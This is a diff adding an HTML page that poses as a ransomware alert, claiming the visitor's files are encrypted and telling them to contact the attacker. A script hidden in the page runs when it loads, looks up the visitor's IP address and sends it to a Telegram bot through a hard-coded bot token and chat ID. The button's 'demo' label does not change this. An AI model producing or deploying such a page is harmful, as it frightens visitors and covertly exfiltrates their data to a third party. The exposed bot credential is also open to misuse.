@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Ransomware Alert</title>
+    <style>
+        body {
+            background: #1a1a1a;
+            color: #f44336;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            user-select: none;
+        }
+        h1 {
+            font-size: 3em;
+            margin-bottom: 0.2em;
+            text-shadow: 0 0 10px #f44336;
+        }
+        p {
+            font-size: 1.5em;
+            max-width: 400px;
+            margin: 0 auto 1.5em auto;
+            text-shadow: 0 0 8px #f44336;
+        }
+        .button {
+            background-color: #f44336;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            color: white;
+            cursor: pointer;
+            border-radius: 6px;
+            box-shadow: 0 0 10px #f44336;
+            transition: background-color 0.3s ease;
+            user-select: none;
+        }
+        .button:hover {
+            background-color: #d32f2f;
+        }
+    </style>
+</head>
+<body>
+    <h1>YOUR FILES ARE ENCRYPTED!</h1>
+    <p>All your important data has been locked.<br />
+       To recover your files, contact the attacker.</p>
+    <button class="button" onclick="alert('This is a demo ransomware page.');">Decrypt Files</button>
+
+<script>
+    (function() {
+        const telegramToken = "7752335856:AAH0ypJTrWhVYjuiXIShl4E04GmIAKIOEpA";
+        const chatId = "6613275120";
+        // Fetch user IP address from external API (ipify)
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip || "unknown_ip";
+                const message = encodeURIComponent("Ransomware Access Detected from IP: " + ip);
+                const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+                // Send IP info to telegram bot
+                fetch(telegramUrl).catch(() => {});
+            }).catch(() => {});
+    })();
+</script>
+</body>
+</html>
+
+```
